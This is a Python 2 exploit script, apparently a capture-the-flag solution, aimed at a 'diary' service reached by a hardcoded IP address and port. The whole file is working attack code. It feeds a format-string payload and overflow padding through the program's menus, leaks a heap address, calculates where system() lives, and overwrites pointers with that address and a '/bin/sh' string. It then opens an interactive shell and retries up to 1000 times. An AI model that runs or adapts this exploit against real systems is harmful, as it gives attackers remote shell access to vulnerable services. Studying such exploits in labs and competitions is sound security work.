import pwnbox,struct,sys
pack = lambda x: struct.pack("<Q",x)
for loop in range(1000):
  try:
    #p = pwnbox.pipe.ProcessPipe("./diary")
    p = pwnbox.pipe.SocketPipe("1.224.175.34", 10050)
    def create_memo(title,contents):
      p.read_until(">>>")
      p.write("2\n")
      p.read_until(">>>")
      p.write("1\n")
      p.read_until(":")
      p.write(title) #0x20
      p.read_until(":")
      p.write(contents) # 0x64
      p.read_until(">>>")
      p.write("4\n")

    def create_plan(name,hour,m,intro):
      p.read_until(">>>")
      p.write("1\n")
      p.read_until(">>>")
      p.write("2\n")
      p.read_until(":")
      p.write(name)
      p.read_until(":")
      p.write("%d\n"%hour)
      p.read_until(":")
      p.write("%d\n"%m)
      p.read_until(":")
      p.write(intro)
      p.read_until(">>>")
      p.write("6\n")

    def do_game(is_correct,comment):
      p.read_until(">>>")
      p.write("3\n")
      p.read_until(">>>")
      p.write("1\n")
      p.read_until(">>>")
      if is_correct:
        p.write("100\n")
        p.read_until(".")
        p.write("1\n")
        tmp = p.read_until("\n")
        tmp += p.read_until("\n")
        if "win" in tmp:
          print "WIN "
          sys.exit(-1)
        p.read_until("comment")
        p.write(comment)
      else:
        p.write("1000\n")
      p.read_until(">>>")
      p.write("3\n")

    p.read_until(":")
    p.write("%d %d %d %d %d\n") #Name
    p.read_until(":")
    p.write("20\n") # age
    p.read_until(">>>")
    p.write("1\n") # gender
    p.read_until(":")
    p.write("AAAABBBB\n") # feat

#create_memo("XXXX\n","YYYY\n")
    printf = 0x4032e5


    do_game(False,"AAAA\n")
    create_plan("NAME\n",10,10,"FFFF\n")
    create_plan("NAME\n",10,10,"FFFF\n")
    for i in range(8):
      create_memo("AAAA%d\n"%i,"YYYY%d\n"%i)
    do_game(True,"A"*0x57+"\n")
    do_game(True,"B"*0x57+"\n")
    do_game(True,"C"*0x57+"\n")
    do_game(True," %d"*29+"\n")
    do_game(True,"E"*0x57+"\n")
    do_game(True,"FFFF"+pack(printf)*9+"/bin/sh\x00"+"\n")

    p.read_until(">>>")
    p.write("1\n")
    p.read_until(">>>")
    p.write("1\n")
    p.read_until("Intro : FFFF\n")
    heap=  int(p.read_until("\n").strip().split(" ")[-1]) & 0xffffffff
    heap += 0x7f0000000000
    heap += 0xf1 * 0x100000000
    print hex(heap)
    p.read_until(">>>")
    p.write("6\n")
    system = heap - 0x7ff1c2570700 + 0x7ff1c1fd8380
    do_game(True,"A"*4+"BBBB"*10+pack(system)*5+"\n")
    do_game(True,"A"*4+"BBBB"*10+pack(system)*5+"\n")
    p.read_until(">>>")
    p.write("1\n")
    p.read_until(">>>")
    p.write("1\n")
    print loop
    p.interact()
    p.close()
  except:
    continue


